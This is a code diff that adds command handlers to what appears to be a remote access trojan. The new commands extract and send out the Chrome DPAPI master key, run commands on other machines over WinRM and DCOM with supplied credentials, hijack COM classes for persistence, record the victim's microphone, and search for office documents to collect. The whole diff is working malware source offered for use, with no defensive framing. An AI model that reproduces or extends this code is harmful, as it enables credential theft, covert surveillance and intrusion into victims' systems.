@@ -304,3 +304,83 @@ class BrowserDumpV2Command(Command):
             results.append(f'Firefox: {e}')
         ctx.protocol.send('\n'.join(results))
         return True
+
+
+class DpapiCommand(Command):
+    name = 'dpapi_dump'
+
+    def execute(self, ctx, raw: str):
+        from client.modules.credentials.dpapi import extract_chrome_key, get_master_key
+        key = extract_chrome_key()
+        if key:
+            import base64
+            ctx.protocol.send(f'[+] DPAPI master key: {base64.b64encode(key).decode()}')
+        else:
+            ctx.protocol.send('[-] DPAPI key extraction failed (Windows-only, Chrome required)')
+        return True
+
+
+class WinrmCommand(Command):
+    name = 'winrm'
+
+    def execute(self, ctx, raw: str):
+        args = raw[6:].strip().split()
+        if len(args) < 4:
+            ctx.protocol.send('[-] Usage: winrm <ip> <user> <pass> <command>')
+            return True
+        from client.modules.lateral.winrm_dcom import winrm_execute
+        ctx.protocol.send(winrm_execute(args[0], args[1], args[2], ' '.join(args[3:])))
+        return True
+
+
+class DcomCommand(Command):
+    name = 'dcom_exec'
+
+    def execute(self, ctx, raw: str):
+        args = raw[10:].strip().split(None, 1)
+        if len(args) < 2:
+            ctx.protocol.send('[-] Usage: dcom_exec <ip> <command>')
+            return True
+        from client.modules.lateral.winrm_dcom import dcom_execute
+        ctx.protocol.send(dcom_execute(args[0], args[1]))
+        return True
+
+
+class ComHijackCommand(Command):
+    name = 'com_hijack'
+
+    def execute(self, ctx, raw: str):
+        args = raw[10:].strip().split()
+        if len(args) < 2:
+            ctx.protocol.send('[-] Usage: com_hijack <clsid> <payload_path>')
+            return True
+        from client.modules.persist.com_hijacking import hijack_com_class
+        ctx.protocol.send(hijack_com_class(args[0], args[1]))
+        return True
+
+
+class MicCommand(Command):
+    name = 'mic'
+
+    def execute(self, ctx, raw: str):
+        seconds = 10
+        args = raw[4:].strip()
+        if args:
+            try:
+                seconds = int(args)
+            except ValueError:
+                pass
+        from client.modules.surveillance.microphone import record_audio
+        ctx.protocol.send(record_audio(ctx.protocol, seconds))
+        return True
+
+
+class FileSearchCommand(Command):
+    name = 'file_search'
+
+    def execute(self, ctx, raw: str):
+        parts = raw[12:].strip()
+        pattern = parts if parts else '*.docx;*.xlsx;*.pdf;*.txt'
+        from client.modules.file_search import search_files
+        search_files(ctx.protocol, pattern)
+        return True
